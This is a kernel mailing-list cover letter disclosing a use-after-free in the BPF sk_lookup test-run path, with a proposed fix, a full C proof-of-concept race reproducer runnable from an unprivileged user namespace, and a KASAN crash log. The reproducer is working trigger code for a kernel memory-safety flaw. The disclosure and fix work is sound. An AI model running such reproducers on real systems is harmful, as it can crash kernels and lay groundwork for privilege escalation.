Received: from mail-pl1-f178.google.com (mail-pl1-f178.google.com [209.85.214.178])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 5E4F53B8959
	for <bpf@vger.kernel.org>; Sat, 29 Aug 2026 15:35:47 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.214.178
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1788017750; cv=none; b=M4OWUQnOwiTcUN9PGHXV7Fi59uiNBep8NbE4GYH6hmzbWNQwujazqLGEFwCOE/GFxO/r/az79i2PQFX6uQExaBuZ0phHSNxuxjVfodx5tJpwWL1Z9XlAUW6o35hNHriAMTq+f8uB1y9mW13NCVZneiVyej4/37xFFtXrHGGP1dU=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1788017750; c=relaxed/simple;
	bh=+LY3IUfbVdjJYo4dSVPUvLYhHJ9lmDxKaRUJj8tR5SI=;
	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version; b=q/kScyAHNps4Phb8B8DExm0dnIqQUjYZ7jnW0wxw8rKheW9y8e7mEWL1CFUjZ/MHwJrOO3q4mlzN1Aie2BWn5r/pj2goCSa0vf4wRlk8mJ2UCgCvI0zRrOB+bEGZRE5V0k6+cfd6UiRijnHblMhXDtFOtok0FAZ4OZ/GZzgZcYc=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai; spf=pass smtp.mailfrom=nebusec.ai; dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b=YJe43ZNc; arc=none smtp.client-ip=209.85.214.178
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b="YJe43ZNc"
Received: by mail-pl1-f178.google.com with SMTP id d9443c01a7336-2d71ae3455aso30525155ad.1
        for <bpf@vger.kernel.org>; Sat, 29 Aug 2026 08:35:47 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=nebusec.ai; s=google; t=1788017747; x=1788622547; darn=vger.kernel.org;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
        bh=rlqkPxSKqWDhfrE3MAifTxyEt5x/6ixtz/84dE/ZwM4=;
        b=YJe43ZNcOYbJKD5M4CfdP2D589ZXlYVTeMv2oawuqnQ13K7YB1MItm3NR8mAMTcoAN
         0iu0nYfxYfN3EGbGHrV1MlrbPlpVAGQ4Wq+tdwLxY77ABfWuCYVgo4B+4mMgr+2n3tEF
         a/kJn8rl/GPugcHL2LkRSkYvZW4uO3joUd8EXW7JoeBEjD/e6Om6pUZdU9XJ3qmB4dUR
         3Mie7ryg/4lDl/Xs/VEsLgXxAKWdyPnVP/Ei6urX8xAo8GRfem8Ayo1mmWJ/w+uPlQ1i
         K1HfuxTKIvgyuS3rRZxq7RU/isR/hZbdt6ASC4bqpKxkN9a9ju+DbNkbcB+DPcoURVHa
         mHrQ==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20251104; t=1788017747; x=1788622547;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
         :message-id:reply-to:content-type;
        bh=rlqkPxSKqWDhfrE3MAifTxyEt5x/6ixtz/84dE/ZwM4=;
        b=Bp+BtG2StQhqAn3UYSHvDFMbcwlV0Rzn6ujpquxxLCPaOzf+DuVo+xZnrLGGBLe6lk
         2KmkSsvWUxG9eICehJ2i1h25E5d8YJv8tr5ppJJqIwzri1nZ2/0JCtKWW0MGe0uUBxJA
         6bm8g02XGM0B3mf/OPMxEL7d+QoefaLivVyGh7jTugds3dIE2kWXJUboxPcOZ/+px6UC
         Yv9swxSjdkYxrGNo+PpEmK+/Rvom5Ftu5u+MA/klGtXl8Ifh0sh02P0dhFqyyf6n8WWW
         8zd0mBZIPnJ/+9PJq8fGUfDlEIq9FJr3RLXdcB/hdk71kFo/4Lfpv2bIWWzOcdX4sWXp
         mvnA==
X-Gm-Message-State: AFuF++kRJzMPQNxW4sGzXHtW6GXpT1ENd1Q1llcqE8vhCUh8nbB7aGWy
	aKbhN2VwHBJ9II+0jdnm6cZS6BrD23aZZaB4XnDKmVeladMSZxRzOfc35NVfoQhyt3gSs+WVsg/
	63LI7AcHC
X-Gm-Gg: AYBFou2NwUs9GqISVv9smWQDhCuhrZ+yF7Ur/9DKlgovOjBMmO3aWeYPmHnb0REL7gE
	1qeZ3ln36jeIC/UFxwXmEzfRJyIk7wzWJEWiWJ2Qp/h8q0GvpkvOfsuryz6IfV8n4jEs3VElOOe
	/zm/v7tGGMacx5FZNGxIMaVC9cl1pKftyyA5bzdowuUjA/Ga0LZ8C4q2CZbuELaXOKFkCOxZmqv
	lLJG8jCvyQrpqHYFetUSw5UHLz5LVytquL7MHkWdRDkWvXsM6XcoMCT3lW0i1wmEZY4otOfc+dN
	YopBmoYAOe7BxHmp81xyRlpzRj2GcbEwb8FnhGqtefiE6nX97qhoIrrvFASqsIBxcoGXvJMwXjK
	7O+N9cNIWNObhFlVm65Ts6Vr+MbwGdO2zaqSi4vj8V6C6j1ylhnruP5MNmoMTVhryIp7ZIxLeJz
	OoYzs3sYGSaKhLxNQb+6tviEpO3ndx9Om7EEWuJY/Yt+P9v5hAuR8vpDbvVQQyfYPSmUNJZaU=
X-Received: by 2002:a17:902:e74c:b0:2d8:d4cc:5bb2 with SMTP id d9443c01a7336-2d8d4cc5dacmr99930125ad.18.1788017747105;
        Sat, 29 Aug 2026 08:35:47 -0700 (PDT)
Received: from enjou-Legion-Y7000P-2019 ([167.71.204.91])
        by smtp.gmail.com with ESMTPSA id 5a478bee46e88-32b49c867f5sm2804628eec.2.2026.08.29.08.35.28
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Sat, 29 Aug 2026 08:35:46 -0700 (PDT)
From: Ren Wei <weir@nebusec.ai>
To: bpf@vger.kernel.org,
	netdev@vger.kernel.org
Cc: ast@kernel.org,
	daniel@iogearbox.net,
	andrii@kernel.org,
	eddyz87@gmail.com,
	memxor@gmail.com,
	martin.lau@linux.dev,
	song@kernel.org,
	yonghong.song@linux.dev,
	jolsa@kernel.org,
	emil@etsalapatis.com,
	davem@davemloft.net,
	edumazet@google.com,
	kuba@kernel.org,
	pabeni@redhat.com,
	horms@kernel.org,
	lmb@cloudflare.com,
	vega@nebusec.ai,
	rakukuip@gmail.com,
	weir@nebusec.ai
Subject: [PATCH 0/1]bpf: Fix use-after-free in bpf_prog_test_run_sk_lookup
Date: Sat, 29 Aug 2026 23:35:14 +0800
Message-ID: <cover.1787897193.git.rakukuip@gmail.com>
X-Mailer: git-send-email 2.53.0
Precedence: bulk
X-Mailing-List: bpf@vger.kernel.org
List-Id: <bpf.vger.kernel.org>
List-Subscribe: <mailto:bpf+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:bpf+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit

From: Luxiao Xu <rakukuip@gmail.com>

Hi Linux kernel maintainers,

We found and validated an issue in net/bpf/test_run.c. The bug is reachable by
an unprivileged user with user/net namespace capabilities (or where unprivileged
BPF is enabled).
We've tested the fix, and it does not break any existing test-run functionality.

We will provide detailed information about the bug below, along with the root
cause and the proposed fix (and a PoC).

---- details below ----

Bug details:

In `bpf_prog_test_run_sk_lookup()`, `bpf_test_timer_leave()` is invoked
immediately after the repeat loop finishes, which drops the RCU read-side lock
via `rcu_read_unlock()`. Subsequently, the kernel dereferences `ctx.selected_sk`
(checking `ctx.selected_sk->sk_reuseport` and calling `sock_gen_cookie(ctx.selected_sk)`)
outside of the RCU read-side critical section.

`bpf_sk_lookup_assign()` explicitly allows selecting non-refcounted sockets
whose lifecycles are protected solely by RCU grace periods. While the program
execution itself runs under RCU protection (established by `bpf_test_timer_enter()`),
dropping the RCU lock before dereferencing `ctx.selected_sk` opens an unprotected
window.

Consequently, if the selected socket is closed concurrently and reclaimed by
RCU callbacks (e.g., `call_rcu` -> `__sk_destruct` -> `kmem_cache_free`) after
the timer loop finishes, accessing `ctx.selected_sk` triggers a slab-use-after-free
(UAF).

Proposed Fix:

We fix this by deferring the `bpf_test_timer_leave()` invocation until after
`ctx.selected_sk` has been checked and its cookie is generated. This keeps
`ctx.selected_sk` continuously protected by the RCU read lock from the final
iteration, while preserving the cooperative scheduling (`cond_resched()`) and
grace period progress inside `bpf_test_timer_continue()`.

Reproducer:

    gcc -O2 -static -o poc poc.c
    unshare -Urn ./poc

We run the PoC in a 2 vCPU, 2 GB RAM x86 QEMU environment.

------BEGIN poc.c------

#define _GNU_SOURCE
#include <arpa/inet.h>
#include <errno.h>
#include <linux/bpf.h>
#include <linux/unistd.h>
#include <pthread.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sched.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <time.h>
#include <unistd.h>

#define ARRAY_SIZE(x) (sizeof(x) / sizeof((x)[0]))
#define LOG_BUF_SIZE (1U << 20)
#define LOOP_ITERS 120000
#define HOG_THREAD_COUNT 4

#ifndef BPF_PSEUDO_MAP_FD
#define BPF_PSEUDO_MAP_FD 1
#endif

#define BPF_RAW_INSN(CODE, DST, SRC, OFF, IMM) \
	((struct bpf_insn){ .code = CODE, .dst_reg = DST, .src_reg = SRC, .off = OFF, .imm = IMM })
#define BPF_LD_IMM64_RAW(DST, SRC, IMM) \
	BPF_RAW_INSN(BPF_LD | BPF_DW | BPF_IMM, DST, SRC, 0, (__u32)(IMM)), \
	BPF_RAW_INSN(0, 0, 0, 0, ((__u64)(IMM)) >> 32)
#define BPF_LD_MAP_FD(DST, MAP_FD) BPF_LD_IMM64_RAW(DST, BPF_PSEUDO_MAP_FD, MAP_FD)
#define BPF_MOV64_IMM(DST, IMM) BPF_RAW_INSN(BPF_ALU64 | BPF_MOV | BPF_K, DST, 0, 0, IMM)
#define BPF_MOV64_REG(DST, SRC) BPF_RAW_INSN(BPF_ALU64 | BPF_MOV | BPF_X, DST, SRC, 0, 0)
#define BPF_ALU64_IMM(OP, DST, IMM) BPF_RAW_INSN(BPF_ALU64 | BPF_OP(OP) | BPF_K, DST, 0, 0, IMM)
#define BPF_ST_MEM(SIZE, DST, OFF, IMM) BPF_RAW_INSN(BPF_ST | BPF_SIZE(SIZE) | BPF_MEM, DST, 0, OFF, IMM)
#define BPF_JMP_IMM(OP, DST, IMM, OFF) BPF_RAW_INSN(BPF_JMP | BPF_OP(OP) | BPF_K, DST, 0, OFF, IMM)
#define BPF_CALL_HELPER(FUNC) BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, FUNC)
#define BPF_EXIT_INSN() BPF_RAW_INSN(BPF_JMP | BPF_EXIT, 0, 0, 0, 0)

static int g_prog_fd = -1;
static int g_sock_map_fd = -1;
static int g_sync_map_fd = -1;
static int g_port = 31337;
static int g_hog_cpu = 0;
static volatile int g_stop_hogs = 0;
static void pin_current_thread_to_cpu(int cpu);

/* Match include/uapi/linux/bpf.h in this kernel tree. */
struct bpf_sk_lookup_ctx {
	union {
		uint64_t sk;
		uint64_t cookie;
	};
	uint32_t family;
	uint32_t protocol;
	uint32_t remote_ip4;
	uint32_t remote_ip6[4];
	uint16_t remote_port;
	uint16_t pad16;
	uint32_t local_ip4;
	uint32_t local_ip6[4];
	uint32_t local_port;
	uint32_t ingress_ifindex;
};

static int bpf_sys(enum bpf_cmd cmd, union bpf_attr *attr)
{
	return syscall(__NR_bpf, cmd, attr, sizeof(*attr));
}

static int create_map(enum bpf_map_type type, uint32_t key_size, uint32_t value_size,
		      uint32_t max_entries)
{
	union bpf_attr attr;

	memset(&attr, 0, sizeof(attr));
	attr.map_type = type;
	attr.key_size = key_size;
	attr.value_size = value_size;
	attr.max_entries = max_entries;
	return bpf_sys(BPF_MAP_CREATE, &attr);
}

static int map_update(int fd, const void *key, const void *value, uint64_t flags)
{
	union bpf_attr attr;

	memset(&attr, 0, sizeof(attr));
	attr.map_fd = fd;
	attr.key = (uintptr_t)key;
	attr.value = (uintptr_t)value;
	attr.flags = flags;
	return bpf_sys(BPF_MAP_UPDATE_ELEM, &attr);
}

static int map_lookup(int fd, const void *key, void *value)
{
	union bpf_attr attr;

	memset(&attr, 0, sizeof(attr));
	attr.map_fd = fd;
	attr.key = (uintptr_t)key;
	attr.value = (uintptr_t)value;
	return bpf_sys(BPF_MAP_LOOKUP_ELEM, &attr);
}

static int map_delete(int fd, const void *key)
{
	union bpf_attr attr;

	memset(&attr, 0, sizeof(attr));
	attr.map_fd = fd;
	attr.key = (uintptr_t)key;
	return bpf_sys(BPF_MAP_DELETE_ELEM, &attr);
}

static int load_prog(int sock_map_fd, int sync_map_fd)
{
	char *log_buf;
	int fd;
	union bpf_attr attr;
	struct bpf_insn insns[] = {
		/* r6 = ctx */
		BPF_MOV64_REG(BPF_REG_6, BPF_REG_1),
		/* key = 0 */
		BPF_ST_MEM(BPF_W, BPF_REG_10, -4, 0),
		BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),
		BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4),
		/* sk = map_lookup(sock_map, &key) */
		BPF_LD_MAP_FD(BPF_REG_1, 0),
		BPF_CALL_HELPER(BPF_FUNC_map_lookup_elem),
		/* if (!sk) goto pass */
		BPF_JMP_IMM(BPF_JEQ, BPF_REG_0, 0, 33),
		BPF_MOV64_REG(BPF_REG_7, BPF_REG_0),
		/* bpf_sk_assign(ctx, sk, 0) */
		BPF_MOV64_REG(BPF_REG_1, BPF_REG_6),
		BPF_MOV64_REG(BPF_REG_2, BPF_REG_7),
		BPF_MOV64_IMM(BPF_REG_3, 0),
		BPF_CALL_HELPER(BPF_FUNC_sk_assign),
		/* bpf_sk_release(sk) */
		BPF_MOV64_REG(BPF_REG_1, BPF_REG_7),
		BPF_CALL_HELPER(BPF_FUNC_sk_release),
		/* sync_map[0] = 1 */
		BPF_ST_MEM(BPF_DW, BPF_REG_10, -16, 1),
		BPF_ST_MEM(BPF_W, BPF_REG_10, -4, 0),
		BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),
		BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4),
		BPF_MOV64_REG(BPF_REG_3, BPF_REG_10),
		BPF_ALU64_IMM(BPF_ADD, BPF_REG_3, -16),
		BPF_LD_MAP_FD(BPF_REG_1, 0),
		BPF_MOV64_IMM(BPF_REG_4, BPF_ANY),
		BPF_CALL_HELPER(BPF_FUNC_map_update_elem),
		/* set loop args: r9=sync_map, r8=&key, r7=&value, r6=counter */
		BPF_LD_MAP_FD(BPF_REG_9, 0),
		BPF_MOV64_REG(BPF_REG_8, BPF_REG_10),
		BPF_ALU64_IMM(BPF_ADD, BPF_REG_8, -4),
		BPF_MOV64_REG(BPF_REG_7, BPF_REG_10),
		BPF_ALU64_IMM(BPF_ADD, BPF_REG_7, -16),
		BPF_MOV64_IMM(BPF_REG_6, 0),
		/* loop: keep updating sync_map to stretch runtime */
		BPF_MOV64_REG(BPF_REG_1, BPF_REG_9),
		BPF_MOV64_REG(BPF_REG_2, BPF_REG_8),
		BPF_MOV64_REG(BPF_REG_3, BPF_REG_7),
		BPF_MOV64_IMM(BPF_REG_4, BPF_ANY),
		BPF_CALL_HELPER(BPF_FUNC_map_update_elem),
		BPF_ALU64_IMM(BPF_ADD, BPF_REG_6, 1),
		BPF_JMP_IMM(BPF_JLT, BPF_REG_6, LOOP_ITERS, -7),
		/* return SK_PASS */
		BPF_MOV64_IMM(BPF_REG_0, SK_PASS),
		BPF_EXIT_INSN(),
		/* pass */
		BPF_MOV64_IMM(BPF_REG_0, SK_PASS),
		BPF_EXIT_INSN(),
	};

	/* Patch map fds in BPF_LD_MAP_FD instructions. */
	insns[4].imm = sock_map_fd;
	insns[21].imm = sync_map_fd;
	insns[25].imm = sync_map_fd;

	memset(&attr, 0, sizeof(attr));
	attr.prog_type = BPF_PROG_TYPE_SK_LOOKUP;
	attr.expected_attach_type = BPF_SK_LOOKUP;
	attr.insn_cnt = ARRAY_SIZE(insns);
	attr.insns = (uintptr_t)insns;
	attr.license = (uintptr_t)"GPL";

	fd = bpf_sys(BPF_PROG_LOAD, &attr);
	if (fd >= 0)
		return fd;

	log_buf = calloc(1, LOG_BUF_SIZE);
	if (!log_buf)
		return -1;

	attr.log_buf = (uintptr_t)log_buf;
	attr.log_size = LOG_BUF_SIZE;
	attr.log_level = 1;
	fd = bpf_sys(BPF_PROG_LOAD, &attr);
	fprintf(stderr, "BPF_PROG_LOAD failed: %s\nVerifier log:\n%s\n", strerror(errno), log_buf);
	free(log_buf);
	return fd;
}

static int make_listener(int port)
{
	struct sockaddr_in addr;
	int fd;

	fd = socket(AF_INET, SOCK_DGRAM, 0);
	if (fd < 0)
		return -1;

	memset(&addr, 0, sizeof(addr));
	addr.sin_family = AF_INET;
	addr.sin_port = htons(port);
	addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);

	if (bind(fd, (struct sockaddr *)&addr, sizeof(addr)) < 0)
		goto err;
	return fd;
err:
	close(fd);
	return -1;
}

static int prog_test_run_once(void)
{
	union bpf_attr attr;
	struct bpf_sk_lookup_ctx ctx;

	memset(&ctx, 0, sizeof(ctx));
	ctx.family = AF_INET;
	ctx.protocol = IPPROTO_UDP;
	ctx.remote_ip4 = htonl(0x7f000002);
	ctx.local_ip4 = htonl(0x7f000001);
	ctx.remote_port = htons(23456);
	ctx.local_port = g_port;

	memset(&attr, 0, sizeof(attr));
	attr.test.prog_fd = g_prog_fd;
	attr.test.repeat = 1;
	attr.test.ctx_in = (uintptr_t)&ctx;
	attr.test.ctx_size_in = sizeof(ctx);
	attr.test.ctx_out = (uintptr_t)&ctx;
	attr.test.ctx_size_out = sizeof(ctx);

	if (bpf_sys(BPF_PROG_TEST_RUN, &attr) < 0)
		return -errno;
	if (ctx.cookie == 0)
		return -ENOENT;
	return 0;
}

struct runner_result {
	int err;
};

static void *runner_thread(void *arg)
{
	struct runner_result *res = arg;

	pin_current_thread_to_cpu(g_hog_cpu);
	res->err = prog_test_run_once();
	return NULL;
}

static int wait_for_signal(uint64_t expected, int timeout_ms)
{
	struct timespec ts = { .tv_sec = 0, .tv_nsec = 1000 * 1000 };
	uint32_t key = 0;
	uint64_t value = 0;
	int waited = 0;

	while (waited < timeout_ms) {
		if (map_lookup(g_sync_map_fd, &key, &value) == 0 && value == expected)
			return 0;
		nanosleep(&ts, NULL);
		waited++;
	}

	return -ETIMEDOUT;
}

static void pin_current_thread_to_cpu(int cpu)
{
	cpu_set_t cpuset;

	CPU_ZERO(&cpuset);
	CPU_SET(cpu, &cpuset);
	pthread_setaffinity_np(pthread_self(), sizeof(cpuset), &cpuset);
}

static void *hog_thread(void *arg)
{
	(void)arg;
	pin_current_thread_to_cpu(g_hog_cpu);
	while (!g_stop_hogs)
		asm volatile("" ::: "memory");
	return NULL;
}

static void force_rcu_activity(void)
{
	pid_t pid = fork();

	if (pid == 0) {
		unshare(CLONE_NEWNET);
		_exit(0);
	}
	if (pid > 0)
		waitpid(pid, NULL, 0);
}

int main(void)
{
	uint32_t key = 0;
	uint64_t zero = 0;
	int attempt;
	long ncpu;
	pthread_t hog_threads[HOG_THREAD_COUNT];
	int i;

	memset(hog_threads, 0, sizeof(hog_threads));

	ncpu = sysconf(_SC_NPROCESSORS_ONLN);
	if (ncpu > 1)
		pin_current_thread_to_cpu(1);

	g_sock_map_fd = create_map(BPF_MAP_TYPE_SOCKHASH, sizeof(uint32_t), sizeof(uint32_t), 1);
	if (g_sock_map_fd < 0) {
		perror("create sockhash");
		return 1;
	}

	g_sync_map_fd = create_map(BPF_MAP_TYPE_ARRAY, sizeof(uint32_t), sizeof(uint64_t), 1);
	if (g_sync_map_fd < 0) {
		perror("create sync map");
		return 1;
	}

	g_prog_fd = load_prog(g_sock_map_fd, g_sync_map_fd);
	if (g_prog_fd < 0)
		return 1;

	printf("Loaded sk_lookup prog fd=%d, sockhash fd=%d\n", g_prog_fd, g_sock_map_fd);
	printf("Running attempts until KASAN crash...\n");
	fflush(stdout);

	if (ncpu > 1) {
		for (i = 0; i < HOG_THREAD_COUNT; i++) {
			if (pthread_create(&hog_threads[i], NULL, hog_thread, NULL) != 0) {
				perror("pthread_create(hog)");
				return 1;
			}
		}
	}

	for (attempt = 1; ; attempt++) {
		pthread_t tid;
		struct runner_result res = { .err = 0 };
		int listener_fd;
		int listener_fd_for_map;

		listener_fd = make_listener(g_port);
		if (listener_fd < 0) {
			perror("make_listener");
			return 1;
		}

		listener_fd_for_map = listener_fd;
		if (map_update(g_sock_map_fd, &key, &listener_fd_for_map, BPF_ANY) < 0) {
			perror("sockhash update");
			close(listener_fd);
			return 1;
		}

		if (map_update(g_sync_map_fd, &key, &zero, BPF_ANY) < 0) {
			perror("sync reset");
			close(listener_fd);
			return 1;
		}

		if (pthread_create(&tid, NULL, runner_thread, &res) != 0) {
			perror("pthread_create");
			close(listener_fd);
			return 1;
		}

		if (wait_for_signal(1, 3000) == 0) {
			if (map_delete(g_sock_map_fd, &key) < 0 && errno != ENOENT)
				perror("sockhash delete");
			close(listener_fd);
			listener_fd = -1;
			force_rcu_activity();
		} else {
			fprintf(stderr, "attempt %d: did not observe sync signal\n", attempt);
		}

		pthread_join(tid, NULL);

		if (res.err)
			fprintf(stderr, "attempt %d: BPF_PROG_TEST_RUN error %d (%s)\n",
				attempt, -res.err, strerror(-res.err));

		if (listener_fd >= 0)
			close(listener_fd);
		if (map_delete(g_sock_map_fd, &key) < 0 && errno != ENOENT)
			perror("sockhash delete");

		if ((attempt % 100) == 0) {
			printf("%d attempts\n", attempt);
			fflush(stdout);
		}
	}

	return 0;
}

------END poc.c--------

----BEGIN crash log----

[  735.659588][T27286] =========================================================
[  735.660413][T27286] BUG: KASAN: slab-use-after-free in bpf_prog_test_run_sk_0
[  735.661415][T27286] Read of size 1 at addr ffff88817789c413 by task poc/27286
[  735.662113][T27286] 
[  735.662489][T27286] CPU: 0 UID: 0 PID: 27286 Comm: poc Not tainted 7.0.0-rc6 
[  735.662498][T27286] Hardware name: QEMU Ubuntu 24.04 PC v2 (i440FX + PIIX, a4
[  735.662515][T27286] Call Trace:
[  735.662526][T27286]  <TASK>
[  735.662530][T27286]  dump_stack_lvl+0x10e/0x1f0
[  735.662639][T27286]  print_report+0xf7/0x600
[  735.662697][T27286]  ? preempt_count_sub+0x13/0xd0
[  735.662747][T27286]  ? __virt_addr_valid+0x1ab/0x330
[  735.662792][T27286]  ? __phys_addr+0x41/0x90
[  735.662802][T27286]  ? bpf_prog_test_run_sk_lookup+0x889/0xd40
[  735.662812][T27286]  kasan_report+0xe4/0x120
[  735.662821][T27286]  ? bpf_prog_test_run_sk_lookup+0x889/0xd40
[  735.662850][T27286]  bpf_prog_test_run_sk_lookup+0x889/0xd40
[  735.662862][T27286]  ? __pfx_bpf_prog_test_run_sk_lookup+0x10/0x10
[  735.662872][T27286]  ? rcu_is_watching+0x3d/0x80
[  735.662903][T27286]  ? __fget_files+0x1a1/0x2f0
[  735.662928][T27286]  ? preempt_count_sub+0x13/0xd0
[  735.662935][T27286]  ? fput+0x70/0xf0
[  735.662947][T27286]  ? __bpf_prog_get+0x7d/0x190
[  735.662976][T27286]  ? __pfx_bpf_prog_test_run_sk_lookup+0x10/0x10
[  735.662985][T27286]  __sys_bpf+0x935/0x3e20
[  735.662999][T27286]  ? __pfx___sys_bpf+0x10/0x10
[  735.663008][T27286]  ? rcu_is_watching+0x3d/0x80
[  735.663016][T27286]  ? trace_irq_enable.constprop.0+0xfd/0x120
[  735.663042][T27286]  ? sched_setaffinity+0x160/0x320
[  735.663063][T27286]  ? should_fail_ex+0x85/0x310
[  735.663131][T27286]  ? __x64_sys_bpf+0x70/0x90
[  735.663137][T27286]  __x64_sys_bpf+0x70/0x90
[  735.663143][T27286]  do_syscall_64+0x116/0x800
[  735.663164][T27286]  entry_SYSCALL_64_after_hwframe+0x77/0x7f
[  735.663182][T27286] RIP: 0033:0x42846d
[  735.663201][T27286] Code: b3 66 2e 0f 1f 84 00 00 00 00 00 66 90 f3 0f 1e fa8
[  735.663207][T27286] RSP: 002b:00007fbc887820f8 EFLAGS: 00000206 ORIG_RAX: 001
[  735.663221][T27286] RAX: ffffffffffffffda RBX: 00007fbc88782cdc RCX: 0000000d
[  735.663226][T27286] RDX: 0000000000000090 RSI: 00007fbc88782170 RDI: 0000000a
[  735.663229][T27286] RBP: 00007fbc88782110 R08: 00007fbc887826c0 R09: 00007fb0
[  735.663233][T27286] R10: 0000000000000000 R11: 0000000000000206 R12: 00007fb0
[  735.663237][T27286] R13: ffffffffffffffb8 R14: 0000000000000002 R15: 00007ff0
[  735.663244][T27286]  </TASK>
[  735.663246][T27286] 
[  735.684836][T27286] Allocated by task 9357:
[  735.685233][T27286]  kasan_save_stack+0x33/0x60
[  735.685708][T27286]  kasan_save_track+0x14/0x30
[  735.686148][T27286]  __kasan_slab_alloc+0x89/0x90
[  735.686599][T27286]  kmem_cache_alloc_noprof+0x23a/0x6d0
[  735.687096][T27286]  sk_prot_alloc+0x4a/0x1f0
[  735.687580][T27286]  sk_alloc+0x36/0xa60
[  735.687941][T27286]  inet_create+0x286/0xa50
[  735.688371][T27286]  __sock_create+0x2c8/0x6e0
[  735.688813][T27286]  __sys_socket+0x122/0x210
[  735.689241][T27286]  __x64_sys_socket+0x40/0x50
[  735.689716][T27286]  do_syscall_64+0x116/0x800
[  735.690151][T27286]  entry_SYSCALL_64_after_hwframe+0x77/0x7f
[  735.690713][T27286] 
[  735.690942][T27286] Freed by task 27287:
[  735.691487][T27286]  kasan_save_stack+0x33/0x60
[  735.692032][T27286]  kasan_save_track+0x14/0x30
[  735.692484][T27286]  kasan_save_free_info+0x3b/0x60
[  735.692976][T27286]  __kasan_slab_free+0x5f/0x80
[  735.693400][T27286]  kmem_cache_free+0x295/0x6e0
[  735.693848][T27286]  __sk_destruct+0x44a/0x710
[  735.694297][T27286]  rcu_core+0x454/0xb20
[  735.694702][T27286]  handle_softirqs+0x168/0x740
[  735.695107][T27286]  do_softirq+0xad/0xe0
[  735.695456][T27286]  __local_bh_enable_ip+0xd1/0xf0
[  735.695966][T27286]  rxrpc_bind+0x70/0x2f0
[  735.696406][T27286]  kernel_bind+0xd8/0x130
[  735.696776][T27286]  afs_open_socket+0x227/0x320
[  735.697217][T27286]  afs_net_init+0x501/0x5b0
[  735.697647][T27286]  ops_init+0x12c/0x3b0
[  735.698045][T27286]  setup_net+0xf7/0x290
[  735.698429][T27286]  copy_net_ns+0x3a4/0x5d0
[  735.698828][T27286]  create_new_namespaces+0x26e/0x5b0
[  735.699270][T27286]  unshare_nsproxy_namespaces+0xdc/0x180
[  735.699735][T27286]  ksys_unshare+0x3c2/0x8c0
[  735.700124][T27286]  __x64_sys_unshare+0x1f/0x30
[  735.700514][T27286]  do_syscall_64+0x116/0x800
[  735.700894][T27286]  entry_SYSCALL_64_after_hwframe+0x77/0x7f
[  735.701419][T27286] 
[  735.701644][T27286] Last potentially related work creation:
[  735.702139][T27286]  kasan_save_stack+0x33/0x60
[  735.702576][T27286]  kasan_record_aux_stack+0xa7/0xc0
[  735.703053][T27286]  __call_rcu_common.constprop.0+0x7c/0x600
[  735.703573][T27286]  sk_destruct+0x68/0xb0
[  735.703924][T27286]  __sk_free+0x89/0x230
[  735.704315][T27286]  sk_free+0x61/0x90
[  735.704642][T27286]  sk_psock_destroy+0x72d/0x7c0
[  735.705071][T27286]  process_one_work+0x62b/0xfb0
[  735.705515][T27286]  worker_thread+0x3fd/0x7e0
[  735.705903][T27286]  kthread+0x221/0x280
[  735.706259][T27286]  ret_from_fork+0x899/0x9b0
[  735.706655][T27286]  ret_from_fork_asm+0x1a/0x30
[  735.707114][T27286] 
[  735.707373][T27286] The buggy address belongs to the object at ffff88817789c0
[  735.707373][T27286]  which belongs to the cache UDP of size 2048
[  735.708447][T27286] The buggy address is located 19 bytes inside of
[  735.708447][T27286]  freed 2048-byte region [ffff88817789c400, ffff88817789c)
[  735.709571][T27286] 
[  735.709776][T27286] The buggy address belongs to the physical page:
[  735.710350][T27286] page: refcount:0 mapcount:0 mapping:0000000000000000 ind8
[  735.711113][T27286] head: order:3 mapcount:0 entire_mapcount:0 nr_pages_mapp0
[  735.711864][T27286] memcg:ffff88817789ff81
[  735.712224][T27286] flags: 0x17ff00000000040(head|node=0|zone=2|lastcpupid=0)
[  735.712867][T27286] page_type: f5(slab)
[  735.713262][T27286] raw: 017ff00000000040 ffff8881096d13c0 dead000000000100 2
[  735.713958][T27286] raw: 0000000000000000 00000008000f000f 00000000f5000000 1
[  735.714643][T27286] head: 017ff00000000040 ffff8881096d13c0 dead0000000001002
[  735.715437][T27286] head: 0000000000000000 00000008000f000f 00000000f50000001
[  735.716185][T27286] head: 017ff00000000003 fffffffffffffe01 00000000fffffffff
[  735.717107][T27286] head: ffffffffffffffff 0000000000000000 00000000ffffffff8
[  735.717920][T27286] page dumped because: kasan: bad access detected
[  735.718560][T27286] page_owner tracks the page as allocated
